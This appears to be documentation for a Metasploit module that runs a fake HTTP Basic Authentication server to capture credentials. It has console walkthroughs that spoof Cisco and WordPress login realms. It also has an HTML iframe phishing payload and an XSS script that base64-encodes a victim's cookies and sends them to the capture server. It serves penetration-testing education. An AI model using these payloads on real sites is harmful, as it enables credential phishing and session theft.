This module creates a mock web server which, utilizing a HTTP 401 response, prompts the user to enter credentials for Basic Authentication.

## Verification Steps

  1. Start msfconsole
  2. Do: ```use auxiliary/server/capture/http_basic```
  3. Do: ```run```

## Options

  **REALM**

  The Realm for the Basic Authentication, which may be displayed in the input box to the user.
  Default is `Secure Site`.
  Some notable Realms to emulate:

  * `level_15 or view_access`
  * `cPanel`
  * `HuaweiHomeGateway`
  * `Broadband Router`

  **RedirectURL**

  After the user enters a set of credentials, their browser will be redirected to this address.  Default is ``.

  **SSL**

  Boolean if SSL should be used, making this HTTPS.  HTTPS is typically run on port 443.  If `SSLCert` is not set, a certificate
  will be automatically generated.  Default is `False`.

  **SSLCert**

  File path to a combined Private Key and Certificate file.  If not provided, a certificate will be automatically
  generated.  Default is ``.

  **URIPATH**

  What URI should be utilized to prompt for the Basic Authentication.  For instance, you may want this to run on `/cisco` if you use
  the `REALM` `level_15 or view_access`.  Default is ``, which will randomly generate a URIPATH.

## Scenarios

### Cisco Emulator with wget Client

Server:

```
msf5 > use auxiliary/server/capture/http_basic 
msf5 auxiliary(server/capture/http_basic) > set REALM "level_15 or view_access"
REALM => level_15 or view_access
msf5 auxiliary(server/capture/http_basic) > set uripath '/cisco'
uripath => /cisco
msf5 auxiliary(server/capture/http_basic) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(server/capture/http_basic) > 
[*] Using URL: http://0.0.0.0:80/cisco
[*] Local IP: http://10.1.1.1:80/cisco
[*] Server started.
[*] Sending 401 to client 127.0.0.1
[+] 127.0.0.1 - Credential collected: "cisco:cisco" => /cisco
```

Client:

```
root@kali:~# wget http://cisco:cisco@127.0.0.1:80/cisco
--2018-11-05 19:44:29--  http://cisco:*password*@127.0.0.1/cisco
Connecting to 127.0.0.1:80... connected.
HTTP request sent, awaiting response... 401 Unauthorized
Authentication selected: Basic realm="level_15 or view_access"
Reusing existing connection to 127.0.0.1:80.
HTTP request sent, awaiting response... 404 Not Found
2018-11-05 19:44:29 ERROR 404: Not Found.
```

### HTTPS with Self-Signed Certificate and curl Client

Server:

```
msf5 > openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
[*] exec: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
............+++++
.+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
msf5 > cat key.pem certificate.pem > selfsigned.pem
[*] exec: cat key.pem certificate.pem > selfsigned.pem

msf5 > cat /root/metasploit-framework/selfsigned.pem
[*] exec: cat /root/metasploit-framework/selfsigned.pem

-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCmniuSmx1h57hK
XxBCfCOfsfJatMEtsrTHFCC0GDvIIHGot8oniVKes7yK0w8GSr0LeJgH23QMf/N0
SZlF6BRc0GELAC7qPa9VJ8HPYYVbO/VaqXMy83y7YuSh6QlP/DksHt0W0rfvcM36
ypHiZ3LIbaz8VuAUyIU5Qa6G+TNvwClhQnaX3TLN0kk31pAwwuSRNvSYvmUih4HA
eN29IJyoiXH+GEjw7wBbm9dkbU1DI71zSZyO/Tfi/2SwDwaTKCucW7tUEd9ey6AU
5hB6jGpc9N7rMYqV82mLogsXGaRDWh/tt9hghGWAX3MfD7EebQqYr4vQssoisU62
ct4DtCrNAgMBAAECggEAJ8ZohnYLHJ0xjGeHPSffZTcYsPiniR45M7ElYXjLhKni
GDHPy4Jnu8UShF2AH7Nlz8A5It8LpBRDbQZI1bxiaAnCsNqZWIfjPEPia3xPVolI
uBztiENCCoXAKLq142dFyrePdexVxo46Td1f2Blz+E7eVdrzYWLBEvsQC96fndRx
8j6KT17tIhGz+9+87dwVUXiiBZTzeWRf94jofek3XWADlu6QjAd3qW944ljYyB7p
+cJGwod5xFUxRdAr12RN+VIuzyP6xUXkfBQImdT3E0nR8LWwb4FcjwrCtCNEEYqU
/CEBx8rm0qt7mBLiIjTq5+clfKKbd1XOXmGn7+7A7QKBgQDdoJl7NBcpBtLMC1kY
KK78kar+nWS5am9H/3o76+sRmQGOCjRg9TyQBmqGkxb7en/m/xZzmS0QxbLCbChj
nOgFn9owQKQ4a2FPiNHQ1BQ7F44E+B4j+1auS7VnpbzhPgyOwmZcDoRn5h+FeNwW
Xma/o+a78rp53eTzG9Hy8lFMwwKBgQDAdX8h8Us1d34a/GuFljUBe5iJNo1giqgq
X8R2BCshvQWoT2wz3YX4FRBKMZKdfwLfbRxK1bzW7BinpgoNR6NV0lor75BgQiCJ
nztUMCfDAkxwCgXZjR20OS106G/SRjRgLtYkdDhmfynyy2MSAKhmVaLxBa57VlXD
ZE2G4jdxLwKBgQCu1oReGnDu77AaQhWOJoItQ+lmpdoRH/McFGJkpS+zmUYNvOUn
XC/j2vvsoFswFqqSG8ild0CDC8OC93pBY0XzMfEZwdULoUKKUQBcwwIWv/VM3ERC
1IPESnuYgbpo4t9bO+cuVlGD+ZoCXJ8bkmtyYaWjvc/4VeHJG7hb9WfHqwKBgAe5
L17nVgNRRkhC9PWpb3sdwKNRAx9qsRDyQuoRhMGX2lBEz6zNKQEppzuy/ZVAcZcR
w97k8O0XEG455ZFe3JknFeNJe9vBC5k6QKFCRXY382VToaR3W0fOO5rDcSlZE+UA
PCu+Vj0WwVIzA0jHqfphWWaeub/NWSe8MLhG/76VAoGBALTnftXB/b45xkgNEIZ3
7WOsfvGo23tlXSQdCNNOn6YKptqYX88jeihcKEvGoIBH+LfV/GfD2P1d227kHyBZ
FoZ+2dUwVXO2UP5j3WlxBleOqk0rTbIri/Pj4oCajAR4pXDIviUD+bUFojyFaysj
It3LYabipjgG3NjDxYBMyJnt
-----END PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDazCCAlOgAwIBAgIUXlRMetgIkrPIiamQGIBKbcEuT1IwDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0xODExMDYwMDQ2NDFaFw0xOTEx
MDYwMDQ2NDFaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQCmniuSmx1h57hKXxBCfCOfsfJatMEtsrTHFCC0GDvI
IHGot8oniVKes7yK0w8GSr0LeJgH23QMf/N0SZlF6BRc0GELAC7qPa9VJ8HPYYVb
O/VaqXMy83y7YuSh6QlP/DksHt0W0rfvcM36ypHiZ3LIbaz8VuAUyIU5Qa6G+TNv
wClhQnaX3TLN0kk31pAwwuSRNvSYvmUih4HAeN29IJyoiXH+GEjw7wBbm9dkbU1D
I71zSZyO/Tfi/2SwDwaTKCucW7tUEd9ey6AU5hB6jGpc9N7rMYqV82mLogsXGaRD
Wh/tt9hghGWAX3MfD7EebQqYr4vQssoisU62ct4DtCrNAgMBAAGjUzBRMB0GA1Ud
DgQWBBR+MfL8LopA4OaIRLGK1gof3u+PIDAfBgNVHSMEGDAWgBR+MfL8LopA4OaI
RLGK1gof3u+PIDAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBe
IGmZr3wlO32b25qj/4qB7ewukwF6uaS4OQh4VLlUk8uYsqoGfvehAaNNJsu1oKO5
XpShHeyEkpwzgx0mdCmQSB3JKseFYuZTgP9GP00EXuHYl2V+quPFN17fq0AgYN6K
TFDwzYbhWyFGz7k++i23w0/dwvL2dLH+bgdHYU49rhlZIAu7PgbyIuhP+M2ltcjt
NDO8po38u2ba52E56abfg0ZlFBqsua2s1TPHIyQ9iovTPMg1E5UTTGebaN6/BaMh
Oj6N43ld9EONST6BhP3v1buoWHi1FMouocrUkUDuahiHoLlK4ERSUrb4uNnwko24
WdNCCmA8APA1qf2BYVqs
-----END CERTIFICATE-----
msf5 > use auxiliary/server/capture/http_basic 
msf5 auxiliary(server/capture/http_basic) > set ssl true
ssl => true
msf5 auxiliary(server/capture/http_basic) > set srvport 443
srvport => 443
msf5 auxiliary(server/capture/http_basic) > set sslcert /root/metasploit-framework/selfsigned.pem
sslcert => /root/metasploit-framework/selfsigned.pem
msf5 auxiliary(server/capture/http_basic) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(server/capture/http_basic) > 
[*] Using URL: https://0.0.0.0:443/4w0tML
[*] Local IP: https://192.168.2.117:443/4w0tML
[*] Server started.
[+] 127.0.0.1 - Credential collected: "admin:password123" => /4w0tML
```

Clients:

```
root@kali:~# curl -k --user admin:password123 https://127.0.0.1/4w0tML
&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
&lt;html>&lt;head>
&lt;title>404 Not Found&lt;/title>
&lt;/head>&lt;body>
&lt;h1>Not Found&lt;/h1>
&lt;p>The requested URL was not found on this server.&lt;/p>
&lt;hr>
&lt;address>Apache/2.2.9 (Unix) Server at  Port 443&lt;/address>
&lt;/body>&lt;/html>
```

### HTML Injection Social Engineering

In this scenario, we're able to inject HTML (but not script) into a website.  We'll inject an `iframe`
that will load our basic authentication website.  This payload will pop-up a login box, with the REALM (title)
set to the website, which will hopefully trick a user into entering their credentials.
**The following scenario is a demonstration, no actual vulnerability was identified, or tested.
The HTML was simply edited in the local browser.**

HTML Payload Injected:

```html
&lt;iframe width="0" height="0" src="http://127.0.0.1/">&lt;/iframe>
```

Server:

```
msf5 > use auxiliary/server/capture/http_basic 
msf5 auxiliary(server/capture/http_basic) > set uripath '/'
uripath => /
msf5 auxiliary(server/capture/http_basic) > set REALM "Wordpress.com Login"
REALM => Wordpress.com Login
msf5 auxiliary(server/capture/http_basic) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(server/capture/http_basic) > 
[*] Using URL: http://0.0.0.0:80/
[*] Local IP: http://192.168.2.117:80/
[*] Server started.
[*] Sending 401 to client 127.0.0.1
[+] 127.0.0.1 - Credential collected: "metasploit_blog:ms08-0sK1NG!" => /
```

Client:

![Injected Payload](https://user-images.githubusercontent.com/752491/48039039-326e1880-e141-11e8-9971-d9c88081d0df.png)

### XSS Cookie Theft

In this scenario, we're able to inject JavaScript into a website.  We'll first get the user's cookie, then with jQuery
pull the username from the `username` field.  Because the cookie may contain fields break URI parsing (like `@`)
we use `btoa` to base64 encode the cookie.  Next we'll write an `iframe`
that will silently attempt a login to our basic authentication website.
**The following scenario is a demonstration, no actual vulnerability was identified, or tested.
The HTML was simply edited in the local browser.**

Payload:

```html
&lt;script>
var cookie = document.cookie;
var username = $('#username').text();
document.write('&lt;iframe width="0" height="0" src="http://' + username + ':' + btoa(cookie) + '@127.0.0.1/">&lt;/iframe>');
&lt;/script>
```

Sever:

```
msf5 > use auxiliary/server/capture/http_basic 
msf5 auxiliary(server/capture/http_basic) > set uripath '/'
uripath => /
msf5 auxiliary(server/capture/http_basic) > set REALM "Login"
REALM => Login
msf5 auxiliary(server/capture/http_basic) > run
[*] Auxiliary module running as background job 0.
msf5 auxiliary(server/capture/http_basic) > 
[*] Using URL: http://0.0.0.0:80/
[*] Local IP: http://192.168.2.117:80/
[*] Server started.
[*] Sending 401 to client 127.0.0.1
[+] 127.0.0.1 - Credential collected: "h00die:R1VDPUFRRUJBUUZicVNGY2owSWVBQVJuJnM9QVFBQUFFUmFpakN4Jmc9VzZmYkdROyB1Y3M9bG5jdD0xNTM3NzI3MjQ4OyBjbXA9dD0xNTQxNDY4ODQ1Jmo9MDsgZmxhc2hfZW5hYmxlZD0wOyBhcGVhZj10ZC1hcHBsZXQtc3RyZWFtPSU3QiUyMnRtcGwlMjIlM0ElMjJpdGVtcyUyMiUyQyUyMmx2JTIyJTNBMTU0MTQ3MDY0NjI4OCU3RDsgSFA9MTsgQj1jN2tvYTYxZDY5dHBzJmI9MyZzPTVy" => /
```

Decoding the cookie:

```
msf5 auxiliary(server/capture/http_basic) > irb
[*] Starting IRB shell...
[*] You are in auxiliary/server/capture/http_basic

>> Base64.decode64('R1VDPUFRRUJBUUZicVNGY2owSWVBQVJuJnM9QVFBQUFFUmFpakN4Jmc9VzZmYkdROyB1Y3M9bG5jdD0xNTM3NzI3MjQ4OyBjbXA9dD0xNTQxNDY4ODQ1Jmo9MDsgZmxhc2hfZW5hYmxlZD0wOyBhcGVhZj10ZC1hcHBsZXQtc3RyZWFtPSU3QiUyMnRtcGwlMjIlM0ElMjJpdGVtcyUyMiUyQyUyMmx2JTIyJTNBMTU0MTQ3MDY0NjI4OCU3RDsgSFA9MTsgQj1jN2tvYTYxZDY5dHBzJmI9MyZzPTVy')
=> "GUC=AQEBAAFbqSFcj0IeBARn&s=AQADAERaieCx&g=W2fb9Q; ucs=lnct=1537714242; cmp=t=1247468145&j=0; flash_enabled=0; apeaf=td-applet-stream=%7B%22tmpl%22%3A%22items%22%2C%22lv%22%3A1541470698788%7D; HP=1; B=c7koa55d69tbs&b=3&s=5r"
```
